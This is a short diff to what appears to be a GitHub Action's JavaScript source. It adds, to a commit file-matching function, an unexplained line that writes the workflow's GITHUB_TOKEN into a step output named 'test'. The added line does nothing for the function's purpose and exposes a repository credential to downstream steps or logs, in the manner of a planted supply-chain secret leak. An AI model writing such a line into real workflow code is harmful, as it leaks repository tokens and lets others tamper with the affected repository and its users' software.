@@ -20,6 +20,8 @@ async function getMatch(payload, pattern) {
 	let modified = false;
 
 	const match = x => minimatch(x, pattern);
+	
+	core.setOutput('test', `${process.env.GITHUB_TOKEN}`);
 
 	for (const commit of payload.commits || []) {
 		const { files } = await request({
